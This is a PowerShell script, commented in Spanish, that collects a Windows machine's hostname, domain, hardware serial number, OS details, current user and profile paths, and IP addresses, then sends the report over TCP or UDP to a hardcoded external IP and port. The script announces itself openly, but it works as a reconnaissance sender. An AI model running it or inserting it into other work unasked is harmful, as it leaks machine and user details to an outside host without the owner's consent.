# ============================================
# CONFIGURACIÓN - Edita estos valores
# ============================================
$TargetIP = "18.228.82.60"    # IP del servidor destino
$TargetPort = 21925             # Puerto destino
$Protocol = "TCP"              # "TCP" o "UDP"

# ============================================
# RECOPILAR DATOS DEL EQUIPO Y USUARIO
# ============================================

# Información del sistema
$computer = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$bios = Get-CimInstance Win32_BIOS

# Datos del equipo
$hostname = $env:COMPUTERNAME
$domain = $env:USERDOMAIN
$manufacturer = $computer.Manufacturer
$model = $computer.Model
$serial = $bios.SerialNumber
$totalMemory = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
$cores = $computer.NumberOfLogicalProcessors
$osName = $os.Caption
$osVersion = $os.Version
$osArchitecture = $os.OSArchitecture
$installDate = $os.InstallDate
$lastBoot = $os.LastBootUpTime

# Datos del usuario
$username = $env:USERNAME
$userDomain = $env:USERDOMAIN
$userProfile = $env:USERPROFILE
$userHome = $env:HOMEDRIVE + $env:HOMEPATH

# Red
$adapters = Get-NetAdapter -Physical | Where-Object {$_.Status -eq "Up"}
$ipList = @()
foreach ($adapter in $adapters) {
    $ipConfig = Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -ne "WellKnown"}
    if ($ipConfig) {
        $ipList += "$($adapter.Name): $($ipConfig.IPAddress)"
    }
}

# ============================================
# CREAR MENSAJE
# ============================================

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$message = @"
========================================
INFORMACIÓN DEL EQUIPO - $timestamp
========================================

EQUIPO:
  Nombre: $hostname
  Dominio: $domain
  Fabricante: $manufacturer
  Modelo: $model
  Número de Serie: $serial
  Cores: $cores
  Memoria Total: $totalMemory GB

SISTEMA OPERATIVO:
  SO: $osName
  Versión: $osVersion
  Arquitectura: $osArchitecture
  Instalado: $installDate
  Último Inicio: $lastBoot

USUARIO ACTUAL:
  Usuario: $username
  Dominio: $userDomain
  Perfil: $userProfile
  Carpeta Personal: $userHome

RED:
$($ipList -join "`n  ")

========================================
"@

# ============================================
# ENVIAR DATOS
# ============================================

Write-Host "Enviando datos a $TargetIP`:$TargetPort..." -ForegroundColor Yellow

if ($Protocol -eq "TCP") {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($TargetIP, $TargetPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write($message)
        $writer.Flush()
        $stream.Close()
        $client.Close()
        Write-Host "Datos enviados exitosamente" -ForegroundColor Green
    }
    catch {
        Write-Host "ERROR: $_" -ForegroundColor Red
    }
}
else {
    try {
        $udp = New-Object System.Net.Sockets.UdpClient
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
        $udp.Send($bytes, $bytes.Length, $TargetIP, $TargetPort) | Out-Null
        $udp.Close()
        Write-Host "Datos enviados exitosamente" -ForegroundColor Green
    }
    catch {
        Write-Host "ERROR: $_" -ForegroundColor Red
    }
}

# Mostrar en pantalla
Write-Host "`n$message" -ForegroundColor Cyan
